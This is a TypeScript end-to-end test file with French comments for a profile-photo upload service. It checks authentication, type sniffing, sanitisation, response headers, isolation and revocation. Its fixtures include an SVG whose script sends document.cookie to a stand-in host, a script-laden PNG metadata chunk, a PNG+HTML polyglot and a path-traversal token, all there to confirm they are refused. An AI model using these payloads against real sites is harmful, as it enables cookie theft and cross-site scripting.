// Photo de profil — chaîne complète : HTTP → validation → MinIO → servitude.
//
// Exigences testées :
//  1. Aucune route d'écriture n'est joignable sans session.
//  2. Un fichier qui MENT sur son type est refusé — l'en-tête `Content-Type`
//     annoncé et l'extension ne font autorité sur rien.
//  3. SVG refusé (vecteur XSS), fichier vide, trop gros, dimensions démesurées.
//  4. Les octets SERVIS sont les octets ASSAINIS, pas ceux reçus.
//  5. La réponse de servitude porte les en-têtes qui rendent le contenu inerte.
//  6. Isolation : aucune route n'accepte d'identifiant d'utilisateur, et la
//     photo de l'un ne peut pas être écrasée ni devinée par l'autre.
//  7. « Retirer ma photo » existe, est idempotent, et RÉVOQUE IMMÉDIATEMENT les
//     URL déjà distribuées.
//  8. Le repli initiales reste servi, avec photo comme sans.
//  9. Stockage non configuré → 503 annoncé, jamais 500 ni acceptation muette.
//
// Prérequis : MongoDB (comme toutes les suites e2e) ET un MinIO joignable via
// `S3_*`. Sans MinIO, les cas qui écrivent réellement sont sautés et le
// signalent — ils ne sont JAMAIS simulés en succès.

import { INestApplication } from '@nestjs/common';
import request from 'supertest';
import { afterAll, beforeAll, expect, it } from 'vitest';

import 'reflect-metadata';

import { dbOf, e2eSuite, makeE2EApp, registerAndLogin, teardown } from './e2e-utils.js';

// ─── Fabriques d'images ──────────────────────────────────────────────────────

const PNG_MAGIC = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function chunk(type: string, data: Buffer): Buffer {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  return Buffer.concat([len, Buffer.from(type, 'latin1'), data, Buffer.alloc(4)]);
}

function png(width = 128, height = 128, extra: Buffer[] = []): Buffer {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 6;
  return Buffer.concat([
    PNG_MAGIC,
    chunk('IHDR', ihdr),
    ...extra,
    chunk('IDAT', Buffer.from([0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

function jpeg(width = 128, height = 128): Buffer {
  const sof = Buffer.alloc(19);
  sof.writeUInt16BE(0xffc0, 0);
  sof.writeUInt16BE(17, 2);
  sof[4] = 8;
  sof.writeUInt16BE(height, 5);
  sof.writeUInt16BE(width, 7);
  sof[9] = 3;
  return Buffer.concat([
    Buffer.from([0xff, 0xd8]),
    sof,
    Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]),
    Buffer.from([0x12, 0x34]),
    Buffer.from([0xff, 0xd9]),
  ]);
}

const SVG_HOSTILE = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">' +
    '<script>fetch("https://evil.example/"+document.cookie)</script></svg>',
);

/** MinIO joignable ? Sans lui, on dit ce qu'on n'a pas pu prouver. */
const S3_CONFIGURE = Boolean(
  process.env['S3_ENDPOINT'] &&
    process.env['S3_ACCESS_KEY'] &&
    process.env['S3_SECRET_KEY'] &&
    process.env['S3_BUCKET_UPLOADS'],
);
const itS3 = S3_CONFIGURE ? it : it.skip;

e2eSuite('photo de profil (stockage objet — docs/17, docs/24)', () => {
  let app: INestApplication;

  const tag = Math.random().toString(36).slice(2, 8);
  const userA = {
    email: `avta-${tag}@lalanda-test.local`,
    password: 'Passw0rd!avta',
    name: 'Alice Avatar',
  };
  const userB = {
    email: `avtb-${tag}@lalanda-test.local`,
    password: 'Passw0rd!avtb',
    name: 'Bob Avatar',
  };

  let cookiesA: string[] = [];
  let cookiesB: string[] = [];

  beforeAll(async () => {
    app = await makeE2EApp();
    cookiesA = await registerAndLogin(app, userA);
    cookiesB = await registerAndLogin(app, userB);
    if (!S3_CONFIGURE) {
      // eslint-disable-next-line no-console
      console.warn(
        'S3_* absent : les cas qui écrivent réellement dans le bucket sont SAUTÉS. ' +
          'Les refus de validation, eux, sont vérifiés — ils précèdent tout appel au stockage.',
      );
    }
  }, 60_000);

  afterAll(async () => {
    // Nettoyage propre à cette suite : `teardown` partagé ne connaît pas
    // `user_avatars`, et l'y ajouter modifierait un fichier partagé.
    try {
      const db = await dbOf(app);
      const users = await db
        .collection('user')
        .find({ email: { $in: [userA.email, userB.email] } })
        .toArray();
      await db
        .collection('user_avatars')
        .deleteMany({ userId: { $in: users.map((u) => String(u['_id'])) } });
    } catch {
      /* la base a pu être fermée avant : le teardown ci-dessous fait le reste */
    }
    await teardown(app, [userA.email, userB.email]);
  }, 30_000);

  const srv = (): ReturnType<INestApplication['getHttpServer']> => app.getHttpServer();

  async function upload(cookies: string[], bytes: Buffer, type = 'image/png') {
    return request(srv())
      .post('/account/avatar')
      .set('Cookie', cookies)
      .set('Content-Type', type)
      .send(bytes);
  }

  /** Chemin absolu extrait de l'URL absolue servie, pour rejouer via supertest. */
  function cheminDe(url: string): string {
    return new URL(url).pathname;
  }

  // ─── 1. Session obligatoire ────────────────────────────────────────────────

  it('sans session : toute écriture est refusée en 401', async () => {
    const sansSession = await request(srv())
      .post('/account/avatar')
      .set('Content-Type', 'image/png')
      .send(png());
    expect(sansSession.status).toBe(401);

    expect((await request(srv()).delete('/account/avatar')).status).toBe(401);
    expect((await request(srv()).get('/account/avatar-limits')).status).toBe(401);
  }, 30_000);

  // ─── 2 & 3. Le fichier ment, ou déborde ────────────────────────────────────

  it('refuse un SVG, MÊME annoncé comme PNG — l’en-tête du client ne fait pas autorité', async () => {
    // Le scénario complet : extension et Content-Type mentent de concert.
    const res = await upload(cookiesA, SVG_HOSTILE, 'image/png');
    expect(res.status).toBe(415);
    expect(res.body.code).toBe('UNSUPPORTED_IMAGE_TYPE');
    expect(res.body.message).toContain('SVG');

    // Et rien n'a été enregistré au passage.
    const profil = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
    expect(profil.body.avatarUrl).toBeNull();
  }, 30_000);

  it('refuse un SVG annoncé comme SVG, avec un message explicite', async () => {
    const res = await upload(cookiesA, SVG_HOSTILE, 'image/svg+xml');
    expect(res.status).toBe(415);
    expect(res.body.code).toBe('UNSUPPORTED_IMAGE_TYPE');
  }, 30_000);

  it('refuse un fichier vide, un GIF et un polyglotte PNG+HTML', async () => {
    const vide = await upload(cookiesA, Buffer.alloc(0));
    expect(vide.status).toBe(400);
    expect(vide.body.code).toBe('EMPTY_FILE');

    const gif = await upload(cookiesA, Buffer.from('GIF89a' + 'x'.repeat(100)));
    expect(gif.status).toBe(415);

    const polyglotte = await upload(
      cookiesA,
      Buffer.concat([PNG_MAGIC, Buffer.from('<script>alert(1)</script>')]),
    );
    expect(polyglotte.status).toBe(400);
    expect(polyglotte.body.code).toBe('MALFORMED_IMAGE');
  }, 30_000);

  it('refuse un fichier au-delà de 2 Mio', async () => {
    const trop = Buffer.concat([png(), Buffer.alloc(3 * 1024 * 1024)]);
    const res = await upload(cookiesA, trop);
    expect(res.status).toBe(413);
    expect(res.body.code).toBe('FILE_TOO_LARGE');
  }, 30_000);

  it('refuse une image aux dimensions démesurées (bombe de décompression)', async () => {
    const res = await upload(cookiesA, png(50_000, 50_000));
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('IMAGE_DIMENSIONS_REJECTED');
  }, 30_000);

  it('sert les bornes de validation plutôt que de les laisser coder en dur', async () => {
    const res = await request(srv()).get('/account/avatar-limits').set('Cookie', cookiesA);
    expect(res.status).toBe(200);
    expect(res.body.maxBytes).toBe(2 * 1024 * 1024);
    expect(res.body.acceptedTypes).toEqual(['image/png', 'image/jpeg', 'image/webp']);
    expect(res.body.acceptedTypes).not.toContain('image/svg+xml');
    expect(res.body.storageAvailable).toBe(S3_CONFIGURE);
  }, 30_000);

  // ─── 4, 5, 8. Cas nominal, octets servis et en-têtes ───────────────────────

  itS3(
    'téléverse, sert les octets ASSAINIS, et expose la photo dans le profil',
    async () => {
      const metadonnee = '<script>document.location="//evil"</script>';
      const envoye = png(128, 128, [chunk('tEXt', Buffer.from(metadonnee))]);

      const post = await upload(cookiesA, envoye);
      expect(post.status).toBe(201);
      expect(post.body.avatar).toMatchObject({
        contentType: 'image/png',
        width: 128,
        height: 128,
      });
      // Les initiales voyagent avec la photo (repli d'affichage).
      expect(post.body.initials).toBe('AA');
      // Ce qui est stocké est plus court que ce qui a été envoyé : le tEXt est parti.
      expect(post.body.avatar.byteSize).toBeLessThan(envoye.length);

      const profil = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      expect(profil.status).toBe(200);
      expect(typeof profil.body.avatarUrl).toBe('string');
      // Exigence 8 : les initiales restent servies MÊME avec une photo.
      expect(profil.body.initials).toBe('AA');
      // L'URL ne porte aucun identifiant d'utilisateur.
      expect(profil.body.avatarUrl).not.toContain(profil.body.id);
      expect(profil.body.avatarUrl).not.toContain(userA.email);

      const image = await request(srv()).get(cheminDe(profil.body.avatarUrl));
      expect(image.status).toBe(200);
      expect(image.headers['content-type']).toBe('image/png');
      expect(image.headers['x-content-type-options']).toBe('nosniff');
      expect(image.headers['content-security-policy']).toContain("default-src 'none'");
      expect(image.headers['content-disposition']).toBe('inline');
      expect(image.headers['cache-control']).toContain('private');

      // Exigence 4 : ALLER-RETOUR RÉEL par MinIO, et la charge est partie.
      const servi = Buffer.from(image.body);
      expect(servi.toString('latin1')).not.toContain('script');
      expect(servi.subarray(0, 8).equals(PNG_MAGIC)).toBe(true);
      expect(servi.length).toBe(post.body.avatar.byteSize);
    },
    60_000,
  );

  itS3(
    'accepte aussi un JPEG, et le type servi est celui DÉDUIT DU CONTENU',
    async () => {
      // Annoncé PNG, réellement JPEG : c'est le contenu qui gagne.
      const post = await upload(cookiesA, jpeg(200, 100), 'image/png');
      expect(post.status).toBe(201);
      expect(post.body.avatar.contentType).toBe('image/jpeg');
      expect(post.body.avatar).toMatchObject({ width: 200, height: 100 });

      const image = await request(srv()).get(cheminDe(post.body.avatarUrl));
      expect(image.headers['content-type']).toBe('image/jpeg');
    },
    60_000,
  );

  // ─── 6. Isolation ──────────────────────────────────────────────────────────

  itS3(
    'isolation : B ne peut ni écraser ni deviner la photo de A',
    async () => {
      const avantA = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      const urlA = avantA.body.avatarUrl as string;
      expect(urlA).toBeTruthy();

      // Aucune route n'accepte d'identifiant d'utilisateur : un `userId` en query
      // n'a nulle part où être lu. L'écriture atterrit chez B, pas chez A.
      const postB = await request(srv())
        .post(`/account/avatar?userId=${avantA.body.id}`)
        .set('Cookie', cookiesB)
        .set('Content-Type', 'image/png')
        .send(png(64, 64));
      expect(postB.status).toBe(201);

      const apresA = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      const profilB = await request(srv()).get('/account/profile').set('Cookie', cookiesB);
      expect(apresA.body.avatar.width).toBe(avantA.body.avatar.width);
      expect(profilB.body.avatar.width).toBe(64);
      // Deux photos, deux objets : les jetons ne partagent pas leur identifiant.
      expect(profilB.body.avatarUrl.split('/').pop()!.split('.')[0]).not.toBe(
        urlA.split('/').pop()!.split('.')[0],
      );

      // La photo de A est intacte et toujours servie.
      expect((await request(srv()).get(cheminDe(urlA))).status).toBe(200);
    },
    60_000,
  );

  itS3(
    'aucune URL forgée ne sert quoi que ce soit — pas d’oracle non plus',
    async () => {
      const profil = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      const jeton = (profil.body.avatarUrl as string).split('/').pop()!;
      const [objectId, exp, sig] = jeton.split('.') as [string, string, string];

      const forgeries: Record<string, string> = {
        'identifiant modifié d’un caractère':
          (objectId[0] === '0' ? '1' : '0') + objectId.slice(1) + `.${exp}.${sig}`,
        'signature tronquée': `${objectId}.${exp}.${sig.slice(0, -1)}`,
        'expiration repoussée': `${objectId}.${Number(exp) + 999_999}.${sig}`,
        'jeton sans signature': `${objectId}.${exp}.`,
        'identifiant en traversée de chemin': `..%2F..%2Fetc.${exp}.${sig}`,
      };

      for (const [nom, forge] of Object.entries(forgeries)) {
        const res = await request(srv()).get(`/account/avatar/${forge}`);
        // 404 pour TOUS les motifs : la route n'apprend rien à qui la sonde.
        expect(res.status, nom).toBe(404);
      }

      // Garde anti-vacuité : le jeton authentique, lui, sert bien l'image.
      expect((await request(srv()).get(`/account/avatar/${jeton}`)).status).toBe(200);
    },
    60_000,
  );

  // ─── 7. Retrait et révocation ──────────────────────────────────────────────

  itS3(
    'remplacer une photo révoque IMMÉDIATEMENT l’URL précédente',
    async () => {
      const avant = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      const ancienne = cheminDe(avant.body.avatarUrl);
      expect((await request(srv()).get(ancienne)).status).toBe(200);

      const post = await upload(cookiesA, png(256, 256));
      expect(post.status).toBe(201);

      // L'ancienne URL n'est pas expirée — elle ne désigne simplement plus rien,
      // parce que le remplacement a tiré un NOUVEL identifiant d'objet.
      expect((await request(srv()).get(ancienne)).status).toBe(404);
      expect((await request(srv()).get(cheminDe(post.body.avatarUrl))).status).toBe(200);
    },
    60_000,
  );

  itS3(
    'retirer sa photo : la photo disparaît, l’URL est révoquée, les initiales reviennent',
    async () => {
      const avant = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      const url = cheminDe(avant.body.avatarUrl);

      const del = await request(srv()).delete('/account/avatar').set('Cookie', cookiesA);
      expect(del.status).toBe(200);
      expect(del.body.removed).toBe(true);
      expect(del.body.initials).toBe('AA');

      expect((await request(srv()).get(url)).status).toBe(404);

      const apres = await request(srv()).get('/account/profile').set('Cookie', cookiesA);
      expect(apres.body.avatarUrl).toBeNull();
      expect(apres.body.avatar).toBeNull();
      // Exigence 8 : le repli initiales redevient la règle.
      expect(apres.body.initials).toBe('AA');
    },
    60_000,
  );

  it('retirer une photo absente n’est pas une erreur — l’état demandé est atteint', async () => {
    const del = await request(srv()).delete('/account/avatar').set('Cookie', cookiesA);
    expect(del.status).toBe(200);
    expect(del.body.removed).toBe(false);
  }, 30_000);

  // ─── 9. Stockage non configuré ─────────────────────────────────────────────

  it('stockage non configuré : 503 annoncé, jamais 500 ni acceptation muette', async () => {
    const initial = process.env['S3_BUCKET_UPLOADS'];
    delete process.env['S3_BUCKET_UPLOADS'];
    try {
      const res = await upload(cookiesB, png(64, 64));
      expect(res.status).toBe(503);
      expect(res.body.code).toBe('STORAGE_UNAVAILABLE');
      expect(res.body.message).toContain('S3_BUCKET_UPLOADS');

      const limites = await request(srv()).get('/account/avatar-limits').set('Cookie', cookiesB);
      expect(limites.body.storageAvailable).toBe(false);
    } finally {
      if (initial === undefined) delete process.env['S3_BUCKET_UPLOADS'];
      else process.env['S3_BUCKET_UPLOADS'] = initial;
    }
  }, 30_000);
});
